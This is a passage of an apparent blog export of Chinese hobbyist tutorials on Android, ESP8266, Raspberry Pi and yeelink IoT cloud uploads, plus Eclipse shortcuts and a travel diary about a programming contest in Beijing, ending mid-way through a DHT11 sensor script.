      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android获取yeelink云端数据]]></title>
    <url>%2F2016%2F06%2F29%2FAndroid%E8%8E%B7%E5%8F%96yeelink%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[虽然前段时间的项目我参与了硬件部分的调试，但是我主要还是负责Android客户端的开发。yeelink是一个物联网云平台，我们可以采用单片机采集数据，然后将数据上传到yeelink，再通过Android客户端去云端获取数据，以便实现远程监测。这篇博客主要讲解如何从yeelink云端获取单片机上传到yeelink云端的数据。 查阅yeelink开发者文档要想查看云端数据，需使用GET方法，对http://api.yeelink.net/v1.0/device//sensor//datapoint/进行请求，对该URL的请求返回指定key的datapoint, 若未指定key, 则返回该sensor的最新数据。 新建并配置工程添加网络访问权限在AndroidManifest.xml文件中加入如下： 1&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt; 编写布局文件添加一个Button用于获取数据，添加一个TextView用于显示获取到的数据。 网络请求库android-async-http的使用android-async-http是一个强大的网络请求库，这个网络请求库是基于Apache HttpClient库之上的一个异步网络请求处理库，网络处理均基于Android的非UI线程，通过回调方法处理请求结果。 jar包下载点击此处可以下载jar包 将jar包添加到工程将jar包复制到lib文件夹下，并右键该jar包，BuildPath–Add to Build Path 编写代码新建一个Http工具类CloudHttpUtil,再新建一个静态方法GetCloudData()，该方法需要两个参数，一个是进行消息传递的Handler，另一个是Http请求的url地址，具体代码如下： 12345678910111213141516171819202122232425262728293031public class CloudHttpUtil &#123;public static void GetCloudData(final Handler handler, String url) &#123; AsyncHttpClient client = new AsyncHttpClient(); //添加Http请求的头部信息 client.addHeader(&quot;U-ApiKey&quot;, &quot;你的API密钥&quot;); //使用get方法获取数据 client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int i, Header[] headers, byte[] bytes) &#123; // TODO Auto-generated method stub String response = new String(bytes); Message msg = new Message(); msg.obj = response; //请求成功后，将返回值通过消息传递到Activity实现数据显示 handler.sendMessage(msg); &#125; @Override public void onFailure(int i, Header[] headers, byte[] bytes, Throwable throwable) &#123; // TODO Auto-generated method stub String response = new String(bytes); //请求不成功时将错误信息打印 System.out.println(response); &#125; &#125;); &#125;&#125; 获取云端数据123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class MainActivity extends ActionBarActivity &#123; private TextView tv_clound_data; private Button btn_get_data; private Handler cloudHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String jsonData = (String) msg.obj; //成功获取数据后，将数据显示在界面上 tv_clound_data.setText(jsonData); //还可以将获得的JSON数据进行解析，以便使用适配器将数据显示在列表等其他地方 JSONArray ja; try &#123; ja = new JSONArray(jsonData); for (int i = 0; i &lt; ja.length(); i++) &#123; JSONObject js = ja.getJSONObject(i); String time = js.getString(&quot;timestamp&quot;); String value = js.getString(&quot;value&quot;); System.out.println(time + value); &#125; &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); //初始化控件 tv_clound_data = (TextView) findViewById(R.id.tv_clound_data); btn_get_data = (Button) findViewById(R.id.btn_get_data); //设置按钮监听事件 btn_get_data.setOnClickListener(new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub //不带参数的请求 //String url = &quot;http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号/datapoint&quot;; //带参数的请求 String url = &quot;http://api.yeelink.net/v1.0/device/你的设备号/sensor/你的传感器号.json?start=2016-05-01T14:01:46&amp;end=2016-06-24T10:01:40&amp;interval=1&quot;; //发送http请求 CloudHttpUtil.GetCloudData(cloudHandler, url); &#125; &#125;); &#125;&#125; 测试效果图不带参数的请求不带参数时将返回最新一个数据点的数据： 带参数的请求带参数时将返回参数指定时间段内的数据： 注：你的云端传感器得有数据才能获取啊，没有数据的话可以在yeelink官网手动添加几个数据，他的API文档中编辑数据，然后有个在线调试，可以模拟Http请求进行数据点的创建。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单片机+ESP8266上传数据到yeelink]]></title>
    <url>%2F2016%2F06%2F29%2F%E5%8D%95%E7%89%87%E6%9C%BA-ESP8266%E4%B8%8A%E4%BC%A0%E6%95%B0%E6%8D%AE%E5%88%B0yeelink%2F</url>
    <content type="text"><![CDATA[前段时间在做一个物联网的项目，需要将采集到的数据通过STM32单片机传送到yeelink云端，虽然之前学过51单片机但是因为ESP8266也是第一次使用，而且STM32没学过，对底层操作通信协议也不清楚，所以调试了很才成功了，现在有时间就把之前的思路理顺一下，希望对初学者有帮助。 串口直接调试一开始是直接和项目成员一起通过STM32的串口发送命令来控制ESP8266进行数据发送，但是一直没成功，也不知道哪里出错了，也是想到可以直接将ESP8266通过单片机的转串口模块连接到电脑，用电脑的串口助手直接发命令给ESP8266进行调试，这样调试成功之后再把STM32加进来就容易多啦。 熟悉操作命令查阅ESP8266的相关资料，以及yeelink的http请求格式，将命令准备在串口调试助手，如下图： 注意选择发送新行，这样串口助手将自动在每一行后面加上回车换行符，具体原因在后面解释。然后在http请求头最后要发送一个空行，在发送请求体，即数据。否则数据上传失败。 硬件连接与设置此处需要借助一个USB转串口的模块，也可以直接用单片机开发板上的转串口模块，将ESP8266的Txd，Rxd引脚与单片机开发板的串口输出引脚反接(即Txd连Rxd，Rxd连Txd)，将Vcc接单片机开发板的Vcc或5V，GND接开发板的GND，然后在电脑上设置串口调试助手波特率为：11520，再按顺序一条一条的发送以下命令，每条命令都会有相应的回应： ESP8266控制指令（1）设置WIFI模式AT+CWMODE=1 （2）重启生效AT+RST （3）连接无线路由器AT+CWJAP=”你的wifi账号”,”你的wifi密码” （4）查询模块IPAT+CIFSR （5）与服务器建立TCP连接AT+CIPSTART=”TCP”,”www.yeelink.net”,80 （6）开启透传模式AT+CIPMODE=1 （7）开始透传AT+CIPSEND 开始透传之后串口助手将显示‘&gt;’符号，已经开启透传模式，表示可以传输数据，如下图： Http请求格式Http请求的格式可以参照yeelink的API文档中的在线调试，如下图： 在线调试发送Http请求之后下面会显示发送Http请求的格式，可直接复制过来用。 进入透传模式之后开始发送http请求获取数据，将以下8条命令一次发送完成，按顺序将命令一个个点击发送完，不要点一个等一下，这个必须将所有命令发送完才会有回应 （1）POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1 （2）User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:9.0.1) Gecko/20100101 Firefox/9.0.1 （3）Host: api.yeelink.net （4）Accept: / （5）Content-Length: 15 （6）U-ApiKey: 这里填写你在yeelink申请的密钥 （7）发送一个空行 （8）{“value”:34.66} 发送成功将获得服务器的200，OK返回。 其实，在这个过程中也遇到了很多坑： （1）本来每发一条命令之后都要加上回车换行表示结束的，一开始没注意串口助手已经勾选发送新行，即自动为每一行添加回车换行，于是每条命令之后都有两个回车换行，就悲剧了。一定要注意你是否勾选上串口调试助手的回车换行。 （2）建议大家还是勾选上串口调试助手的发送新行，一方面不用自己去写回车换行符，另一方面也省去了考虑加转义字符的麻烦。亲测，串口助手还不一定可以识别你自己写的回车换行符。 （3）Http请求一定是一次性发送完才会有响应，否则服务器无法判断你的请求是否发送完。 单片机控制ESP8266以上的测试成功以后，应该怎么发送命令，怎么发送Http请求就已经很清楚了，将这些命令和请求嵌入到STM32的代码中，然后用STM32的串口通过printf函数进行输出，便可以很方便的实现我们需要的功能。当然，此时需要注意为每一行命令加上回车换行符，以及转义字符的处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768//串口3,printf 函数//确保一次发送数据不超过USART3_MAX_SEND_LEN字节void u3_printf(char* fmt,...) &#123; u16 i,j; va_list ap; va_start(ap,fmt); vsprintf((char*)USART3_TX_BUF,fmt,ap); va_end(ap); i=strlen((const char*)USART3_TX_BUF); //此次发送数据的长度 for(j=0;j&lt;i;j++) //循环发送数据 &#123; //循环发送,直到发送完毕 while(USART_GetFlagStatus(USART3,USART_FLAG_TC)==RESET); USART_SendData(USART3,USART3_TX_BUF[j]); &#125; &#125;/*ESP8266连接网络与发送Http请求的部分代码*///设置WIFI模式u3_printf(&quot;AT+CWMODE=1\r\n&quot;);delay_ms(1000);//重启生效u3_printf(&quot;AT+RST\r\n&quot;);delay_ms(1000);//连接无线路由器，需延时等待连接成功u3_printf(&quot;AT+CWJAP=\&quot;你的wifi账号\&quot;,\&quot;你的wifi密码\&quot;\r\n&quot;); delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);delay_ms(1000);//此处省略了查看ip地址//与服务器建立TCP连接u3_printf(&quot;AT+CIPSTART=\&quot;TCP\&quot;,\&quot;www.yeelink.net\&quot;,80\r\n&quot;);delay_ms(1000);delay_ms(1000);//开启透传模式u3_printf(&quot;AT+CIPMODE=1\r\n&quot;);delay_ms(1000);//开始透传u3_printf(&quot;AT+CIPSEND\r\n&quot;);delay_ms(10);//开始发生Http请求u3_printf(&quot;POST /v1.0/device/你的设备号/sensor/你的传感器号/datapoints HTTP/1.1\r\n&quot;);u3_printf(&quot;Host: api.yeelink.net\r\n&quot;);u3_printf(&quot;Accept: */*\r\n&quot;);u3_printf(&quot;U-ApiKey: 你在yeelink申请的密钥\r\n&quot;);u3_printf(&quot;Content-Length: 15\r\n&quot;);//设置短连接，连接双方都会要求在处理请求后关闭它们的TCP连接u3_printf(&quot;Connection: close\r\n&quot;);u3_printf(&quot;\r\n&quot;); //发送数据u3_printf(&quot;&#123;\&quot;value\&quot;:34.66&#125;); delay_ms(1000);//关闭透传u3_printf(&quot;+++&quot;);]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>［单片机,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android开发之eclipse快捷操作]]></title>
    <url>%2F2016%2F06%2F18%2FAndroid%E5%BC%80%E5%8F%91%E4%B9%8Beclipse%E5%BF%AB%E6%8D%B7%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[本文总结了一些eclipse常用的快捷键以及快捷操作的小技巧，熟悉使用这些操作对于提高开发效率将会很有帮助。 eclipse快速注释（1）行注释： ctrl+/ （2）取消行注释： 再按一次ctrl+/ （3）块注释: ctrl+shift+/ （4）取消块注释： ctrl+shift+\ eclipse快速编辑（1）快速删除当前行： ctrl+D （2）代码编辑窗口缩放： ctrl+M，再按一次则可以恢复 （3）快速切换代码编辑窗口： ctrl+F6 （4）大小写切换： Ctrl+Shift+Y 大写变小写 Ctrl+Shift+X 小写变大写 （5）复制行： Ctrl+Alt+向上 复制当前行到上一行 Ctrl+Alt+向下 复制当前行到下一行 （6）移动行： Alt+向下 快速提取某行到下边指定位置 Alt+向上 快速提取某行到上边指定位置 （7）下一个错误及快速修改： Ctrl+.及Ctrl+1 （8）快速跳转到申明： F3 （9）重命名： F2 （10）回到最后一次编辑的地方： ctrl+Q （11）快速查看当前类的方法或某个特定方法： ctrl+O （12）配置行号： 点击菜单栏的Windows—&gt;preference—&gt;General—&gt;Editors—&gt;Text Editors将show line numbers选上 （13）增强代码提示功能： 点击菜单栏的Windows—&gt;preference—&gt;Java—&gt;Editors—&gt;Content Assist将Auto activation atriggers for java后面的“.”换成“abcdefghijklmnopqrstuvwxyz.” 快速生成（1）快速复写超类的方法： 点击右键—&gt;source—&gt;Generate Constructors from Superclass （2）批量生成get、set方法： 点击右键—&gt;source—&gt;Generate Getters and Setters （3）快速生成构造方法： 点击右键—&gt;source—&gt;Generate Constructor using Fields （4）使用代码模板（需选中代码）： Alt+Shift+Z （5）快速导入包： Ctrl+Shift+O （5）快速添加javadoc注释： Ctrl+Shift+J 美化代码（1）快速格式化代码： Ctrl+Shift+F （2）成员排序： 选择菜单栏source—&gt;Sort Members，使变量名、方法名或者类名按首字母大小排序 （3）整理导入的包： 选择菜单栏Source—&gt;Organize Imports 或者使用Ctrl+Shift+O,可以快速导入缺少的包以及删除不需要的包 代码重构(Refactor)快速打开Refactor菜单：Alt+shift+T （1）Rename 选中变量或者方法名等需要更改的名字，点击菜单栏Refactor——&gt;Rename（或者使用快捷键alt+shift+R）即可实现代码中某一变量、方法或者类名进行全部重命名替换 （2）Move 点击菜单栏Refactor—&gt;Move（或者使用快捷键alt+shift+V），将该java文件移动到其他的包 （3）修改方法结构 点击菜单栏Refactor—&gt;Change Method Signature（或者使用快捷键alt+shift+C），不管有多少个函数调用了这个方法，修改一次就能全部搞定 （4）抽取方法 选中需要单独生成方法的代码，点击菜单栏（或者右键）Refactor—&gt;Extract Method（或者使用快捷键alt+shift+M）,这是重构里面最常用的方法之一 （5）抽取本地变量 选中数字或字符串，点击菜单栏（或者右键）Refactor—&gt;Extract Local Variable（或者使用快捷键alt+shift+L）， 可以直接把数字和字符串抽取成一个变量 （6）撤销重构： alt+shift+Z或者ctrl+Z]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,eclipse］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+motion实现局域网简单监控]]></title>
    <url>%2F2016%2F06%2F14%2F%E6%A0%91%E8%8E%93%E6%B4%BE-motion%E5%AE%9E%E7%8E%B0%E5%B1%80%E5%9F%9F%E7%BD%91%E7%AE%80%E5%8D%95%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[检查USB摄像头主要检查摄像头是否被树莓派检测到（同博主上一篇树莓派的博客） 如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源USB hub，并重新输入lsusb命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。 配置motion注意：本文以Raspbian系统为例 安装motion输入命令： 1sudo apt-get install motion 配置motion daemon 守护进程输入命令编辑motion： 1sudo nano /etc/default/motion 把里面的no修改成yes，让他可以一直在后台运行： 1start_motion_daemon=yes 修改motion的配置文件（1）输入命令 1sudo vim /etc/motion/motion.conf （2）修改配置文件 将第11行的daemon off 改成daemon on，如下图： 该文件很长，需要一直往下翻，直到464行你才看到端口号8081，我们通过这个端口来读取视频数据，这里无需修改！如下图： 然后到第477行将stream_localhost on改成off，即关闭 localhost 的限制，如下图： 当然，你也可以设定图片的分辨率，在第90行进行修改： 最后，vim编辑器下按esc然后输入：wq，即保存退出。 配置启动（1）输入下面命令启动服务： 1sudo service motion start （2）输入以下命令开启motion： 1sudo motion 查看效果打开浏览器，输入http://树莓派IP:8081即可查看拍到的图像，如下图： 需要注意的问题浏览器的问题经过测试，Google浏览器和火狐浏览器可以访问到图像，IE、Microsoft Edge和360都不显示图像，而是提示下载，一直下载，其他的没有测试。 局域网限制之前看到别人的教程写的是外网也可以访问，实际上如果你没有配置你的树莓派成为服务器的话，你的树莓派的ip地址都是私有地址，外网无法访问，只能在局域网内部使用。 摄像头的问题树莓派供电不足也会影响视频质量，就像我上面的视频不是很清楚，我是直接用笔记本的USB供电的，一般来说笔记本USB口电流一般为500mA，所以如果需要视频清晰的话建议使用移动电源进行供电，或者使用有源USB hub。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,监控,motion］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蓝桥杯决赛之行---北京]]></title>
    <url>%2F2016%2F06%2F10%2F%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E4%B9%8B%E8%A1%8C-%E5%8C%97%E4%BA%AC%2F</url>
    <content type="text"><![CDATA[端午节都过去了，和室友出去浪了一天，回来已经很累了，但是突然想到这一篇博客还没有写完，从北京回来也将近10天了，我估计如果再不写以后就不会写了。这段时间断断续续写了一点，但是写着写着又觉得自己在记流水账，然后就不想写下去了，感觉写作能力是越来越差了。但是，我觉得这一篇我必须得完成它，毕竟这次去北京参加蓝桥杯决赛自己收获很多，也有很多可以讲述的故事，这样的总结不管是对自己来说还是对看这篇博客的人来说都会有意义。有兴趣就听我唠叨唠叨吧~ 5月26日晚，怀着对帝都的期待与蓝桥杯决赛的担忧踏上了去往北京的火车。还好是卧铺，睡一晚就可以到北京。蓝桥杯决赛，其实并没有准备多久。现在想起来原因很多，忙碌的五月，似乎好多计划都被打乱，因为软考，因为期中考，还因为很多要去争取的东西，准备比赛的心思也没有了，省赛时大家一起备赛的氛围也没了，实验室被做毕业设计的学长学姐霸占，自己只能在寝室写写代码，积极性并不高。所以，只在最后几天好好复习了一下基本的模块，然后准备了一些资料到火车上看，但是因为是和其他实验室的小伙伴一起去，所以并不好自己一个人看代码，而是听带队老师讲讲故事，和他们一起玩玩，熄灯后就各自睡了，并没有做任何的复习。 5月27日早，到达北京西站，指导老师已经提前订好房间，我们准备坐地铁去住的地方，在地铁站，10几条地铁线路将北京完全覆盖，早高峰地铁排队的场景让我感叹大城市的不易。很幸运的是出了地铁站便看到北京展览馆，而且正好第二十届中国国际软件博览会，指导老师提议要去看一看，领了免费的入场券，然后回宾馆放行李，休整了一会就去看博览会了。 不愧是中国国际软件博览会，我国的各个省都有展区，还有韩国日本的展区。比较大的馆主要还是北上广、成都、南京这些地方的，毕竟产业链比较完善。很多互联网公司都展示了他们的产品，也提供了很多宣传资料。在这次博览会中，我们不仅看到了很多新的科技产品，比如能和人对话的机器人、VR眼镜、无人机等，而且还看到了自己之前了解过的一些项目，之前想过用树莓派去做停车场管理系统，因为在国内树莓派的资源相对较少，而比较成功的例子恰好是北邮的几个学生做的基于树莓派和微信的停车场视频监控系统，在这次展览中也看到好几家公司都有在做停车场管理系统，只是侧重的方面不太相同，也和展台的工作人员有过交流，都还做得比较成功。也看到了做农产品电商的公司，之前自己也弄过一个掌上农资宝的项目，想着去做一个卖农资的安卓App，当时因为自己才刚刚开始学安卓，所以也只是参加了两个比赛，并没有真正去做。在广州馆看到了机智云，一家做物联网云平台的公司，之前根本不知道，因为自己一直用的青岛的一家物联网云平台：yeelink，觉得还挺不错的，这次的发现又让我多了一个选择。在香港馆看到了做儿童编程玩具的，与工作人员交流之中了解到，他们的产品就是用的esp8266无线模块连接手机来进行控制，因为实验室也有这个模块，所以觉得这个东西还挺不错的，值得以后去玩一下。还在安徽馆看到了科大讯飞的展台，因为之前用过科大讯飞的语音SDK，所以感觉很熟悉。总之，这次博览会让我对这个行业有了更多的了解，通过与工作人员交流，我对于这些技术也有了新的认识，也开阔了视野。有些技术能力可能我们已经具备了，只是缺少创新的思想，没有去尝试。 中午带队老师带我们去吃了自助，到北京的第一顿饭，吃的很饱也很爽。下午休息了一下就到北方工业大学去看考场了，在百度地图的指引下一路公交到达考点花了将近两个小时，确实有点远，计划第二天早上要很早起来，然后坐地铁过去，毕竟怕迟到。北方工业大学博远楼是新建不久的大楼，里面的设备都很好，大教室有100堕胎电脑，好几个大的显示屏，很是羡慕，毕竟帝都的学校啊，比我们的条件真的好很多。到赛场熟悉了比赛要使用的电脑之后我们便赶回宾馆与带队老师汇合。吃过晚饭后去了北大，虽然晚上不太看得清，但是还是有几点很不一样的感受，第一是北大的自行车特别多，几乎所有教学楼旁边都停满了自行车，然而在我们学校这样的场景是看不到的，这或许也是一种氛围吧，快节奏的校园生活。第二是课堂氛围好，观察了课堂最后几排的同学，基本没有在玩手机的，都在认真听讲，这和我们学校也是天然之别。第三是北大学生的气质都不一样，特别是女生，有一种肃然起敬的感觉。在未名湖畔，听带队老师给我们介绍北大，也是很不错的经历了。晚上回到宾馆已经10点，突然发现奔波了一天，感觉很累了，但是想到明天的比赛还剩很紧张，本来来北京之前准备了一些资料，准备在火车上或者到宾馆再认真看看，但是一直没有机会。现在终于可以再好好准备一下明天的比赛了，于是又和队友一起认真的写代码，记代码，熟悉自己还不熟练的模块，差不多到12点，累得不行了，就休息了。 5月28日早，因为住的地方离考点：北方工业大学有点远，坐地铁转公交加起来差不多要一个小时，所以我们早早的就出发了，到那里时后到处找卖早餐的地方，很是着急，匆匆吃完早餐就去考场了。一进大楼就有武警保守，突然觉得有点紧张了，排队进场然后抽取座位号，40号，说实话，不太喜欢的一个数字，但是当时也没想太多。找到座位后，我发现很多人已经开始在写代码了，于是我也里面开始建工程，把基本的代码框架搭好，等到老师发布题目时我已经能够让数码管显示数字了，这一点很重要，争取了一点点时间。然后，突然被告知这个机房的Altium Designer由于没有破解，很多电脑都用不了，所以只能用protel99 se，但是我从来都没用过，所以我当时就很慌了，打开protel 99后发现是英文版的，我连元器件都找不到！琢磨了几分钟后我放弃了，决定先把题目要求的功能实现，毕竟电路图只有十分。这次的题目相比省赛的题目难多了，时间一样，但是要求更多，逻辑更复杂。折腾了好一会，遇到不少的问题，发现原本熟悉的矩阵键盘也不灵了，最后赛点老师提示大家由于题目要测555产生的波的频率和周期，占用了P3.4口，所以会影响矩阵键盘，希望大家明白这不是板子的问题，我突然明白了，然后开始根据题目需求改矩阵键盘的检测代码。写着写着，又发现竞赛给的驱动代码也有问题，这个问题是我们在准备省赛的时候就发现了的，当时认真的解决了这个问题，但是我始终坚信竞赛的时候给的驱动代码是不会有问题的，于是决赛的备赛阶段我就没怎么注意这个问题。AD得到的数据一直在跳，到最后也没有稳定下来，但是AD是可以用的。后来发现时间越来越紧了，也是决定改变策略，把思路理清，把基本的界面和功能先实现，更深入的要求如果没时间就不做了。 5月28日下午，比赛就这样结束了，或许一切结束的太快，突然觉得如释重负，又觉得这次要拿奖很悬。仔细想了想，反正明天就出结果，今天得好好玩一玩，然后直接去了天安门城楼。公交转地铁，一路都很顺利，不得不感慨帝都的路面交通经常很堵，但是地铁真的是很方便。天安门城楼和天安门广场到处都有安保，进入天安门区域还有安检。以前只能在电视里看到的地方，现在自己终于有机会亲临现场感受祖国的伟大。4点过3分到达故宫售票点，却发现4点后不再售票，这也许是这次北京之行的一大遗憾了吧。看了中山公园、天安门广场、人民英雄纪念碑、人民大会堂、毛主席纪念堂等，具体的就不在这里一一描述了，感觉已经有点记流水账了。 5月28日晚上，先描述一下行程吧，因为指导老师以前的几个学生在北京工作，听说老师来北京了，特意来请老师吃饭，顺便把我们也带上了，吃完还带我们到鸟巢、水立方、奥林匹克森林公园附近转了转。然后谈谈感想，我是觉得很有幸能够见到几位07级的学长，几位学长以前是农大的，考了北邮、北航这样的学校的研究生，他们现在在阿里、360、百度这样的公司工作，以前都是从实验室出来的，他们都觉得是实验室的老师教会了他们很多，也是在实验室他们得到了很多锻炼。其中有一位学长本科是学经济学的，因为兴趣加入了我们院的ACM实验室，后来考上了北邮的研究生，现在在阿里做搜索方面的工作，这让我很佩服，然后我去看了他的博客，他从11年开始写，一直到现在都还有更新。与几位学长交流了很多，了解到360竟然有专门的爬虫部门，在阿里的学长说我们在大学能够做一个不错的搜索引擎项目就很不错了。交流之中，我也明白了做技术确定比较辛苦，坚持去做一件事情也确实不容易，但是如果能深入下去还是会找到不一样的快乐。 5月29日，长城一日游，也是一次充满故事的旅行吧！未完待续，有时间继续更新继续修改。 因为是第一次去北京，所以本来就很特殊。 特殊到我可以开心好久好久！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+USB摄像头+yeelink实现云监控]]></title>
    <url>%2F2016%2F06%2F10%2F%E6%A0%91%E8%8E%93%E6%B4%BE-USB%E6%91%84%E5%83%8F%E5%A4%B4-yeelink%E5%AE%9E%E7%8E%B0%E4%BA%91%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[配置USB摄像头检查摄像头是否被树莓派检测到输入命令： 1$ lsusb 查看输出信息 如上图我们可以看到camera的信息，如果没有你的摄像头的信息，那么有可能你的树莓派的电源无法供应足够的电力给你的摄像头。这时你可以给你的摄像头用独立的电源线，比如有源USB hub，并重新输入lsusb命令查看。如果摄像头还是不能被识别，我们只有建议你购买其他树莓派支持的摄像头了。 安装fswebcam要想拍摄照片，你要安装fswebcam，这是一款小型摄像头程序。你可以直接通过Raspbian的仓库来安装fswebcam。 输入命令： 1sudo apt-get install fswebcam 配置yeelink云端 到yeelink官网注册一个账号 添加一个新设备,填写基本信息 点击管理设备，然后添加一个传感器 查看API文档 配置shell脚本 创建shell脚本输入命令 1touch yeelink.sh 打开yeelink.sh输入命令： 1nano yeelink.sh 编辑yeelink.sh写入如下两行，然后保存退出： 12sudo fswebcam -d /dev/video0 -r 800x600 --bottom-banner --title &quot;RaspberryPi@Yeelink&quot; --save /home/pi/yeelink.jpgcurl --request POST --data-binary @&quot;/home/pi/yeelink.jpg&quot; --header &quot;U-ApiKey:这里填写你自己的ApiKey&quot; http://api.yeelink.net/v1.0/device/你的设备码/sensor/你的传感器码/photos 为脚本增加可执行权限输入命令： 1chmod +x yeelink.sh 将脚本加入cronjob定时任务输入命令： 1crontab -e 加入下面一行, 让脚本每分钟运行一次,即发送一张图片，然后保存退出 1*/1 * * * * /home/pi/yeelink.sh 至此，我们的项目就完成了，我们可以到yeelink网站上去管理我们的设备，可以看到每隔一分钟会收到一张图片。如下图是我测试时的图片：]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,监控,yeelink］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[单片机设计与开发：前后台系统]]></title>
    <url>%2F2016%2F06%2F03%2F%E5%8D%95%E7%89%87%E6%9C%BA%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%BC%80%E5%8F%91%EF%BC%9A%E5%89%8D%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[前后台系统的架构简单来说就是一个大的循环，加上中断，就形成了一个整的体系。如GPIO、定时器、数码管实验等都是前后台系统架构，任务顺序地执行的，而前台指的是中断级，后台指的是main函数里的程序即任务级。 前后台系统又叫作超级大循环系统，这个可以从“while(1)”关键字眼就可以得知。这样的系统比较简单，实时性，并行性要求不太高的情况下是不错的方法，程序设计简单，思路比较清晰。但是当应用程序比较复杂的时候，如果没有一个完整的流程图，恐怕别人很难看懂程序的运行状态，而且随着程序功能的增加，编写应用程序的工程师的大脑也开始混乱。即不利于升级维护，也不利于代码优化。比较复杂一点的应用程序，使用此法虽然能够实现功能，但是自己的思维一直处于混乱状态，导致程序一直不能让自己满意。 这里通过一个简单的例子来说明前后台系统设计的思想，相信很多人平常也这么用过，但是可能并不知道这就是前后台系统的思想。很简单，我们通过单片机来实现一个温度采集并将温度显示在数码管上的小实验。在这里数码管显示就相当于前台，所以display函数放在中断服务函数里，是它能够2ms更新一次数据，然后在主函数通过while(1)循环实现后台任务，即温度采集与数据处理，最终实现温度实时更新。代码框架如下： 123456789101112131415161718192021222324252627282930313233343536void display() //数码管显示函数&#123; ........ //段选 ........ //位选 ........ //消影&#125;void init_timer() //定时器0初始化&#123; TMOD = 0x01; TH0 = (65536-2000)/256; TL0 = (65536-2000)%256; EA = 1; ET0 = 1; TR0 = 1;&#125;void main()&#123; uint temp; uchar adc,num; init_timer(); //定时器初始化 while(1) &#123; ...... //温度采集 ...... //数据处理 &#125;&#125;void timer() interrupt 1 //定时器0中断服务函数&#123; TH0 = (65536-2000)/256; TL0 = (65536-2000)%256; display(); //每2ms显示一次&#125; 当然，前后台系统设计一定要注意一条原则： 紧急的事务一定要用中断处理，中断只处理紧急事务！ 在前后台系统当中，关键的时间操作必须通过中断操作来保证实时性，由于前后台系统中的任务是顺序执行的，中断服务函数提供的信息需要后台程序走到该处理这个信息这一步时才能得到处理的，倘若任务数越多，实时性更加得不到保证，因为循环的执行时间不是常数，程序经过某一特定部分的准确时间也是不能确定的。进而，如果程序修改了，循环的时序也会受到影响。很多基于微处理器的产品采用前后台系统设计，例如微波炉、电话机、玩具等。在另外一些基于微处理器的应用中，从省电的角度出发，平时微处理器处在停机状态(halt)，所有的事都靠中断服务来完成。]]></content>
      <categories>
        <category>IoT</category>
        <category>Embedded system</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派+DHT11温湿度传感器+yeelink物联网云]]></title>
    <url>%2F2016%2F06%2F02%2F%E6%A0%91%E8%8E%93%E6%B4%BE-DHT11%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-yeelink%E7%89%A9%E8%81%94%E7%BD%91%E4%BA%91%2F</url>
    <content type="text"><![CDATA[配置准备DHT11简介DHT11是一款有已校准数字信号输出的温湿度传感器。 精度湿度+-5%RH， 温度+-2℃，量程湿度20-90%RH， 温度0~50℃。 DHT11有四个引脚，分别是VCC，DATA，NC，GND 电路连接本博文中python程序使用的是BCM编号方式，17号即pin11接DHT11的DATA，VCC接3.3V，NC悬空，GND接0V，可通过下图找到对应引脚，进行连线。 用python读取温湿度数据关于DHT11具体的时序，以及如何操作，在我的博客《 51单片机DHT11温湿度传感器》中有详细分析，有兴趣可以去了解一下，以便你可以看懂下面的python程序。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#!/usr/bin/pythonimport RPi.GPIO as GPIOimport time#BCM编号方式的17对应树莓派的pin11channel = 17data = []j = 0#I/O口使用BCM编号方式GPIO.setmode(GPIO.BCM)time.sleep(1)#设置数据线为输出GPIO.setup(channel, GPIO.OUT)GPIO.output(channel, GPIO.LOW)time.sleep(0.02)GPIO.output(channel, GPIO.HIGH)#设置数据线为输入GPIO.setup(channel, GPIO.IN)while GPIO.input(channel) == GPIO.LOW: continuewhile GPIO.input(channel) == GPIO.HIGH: 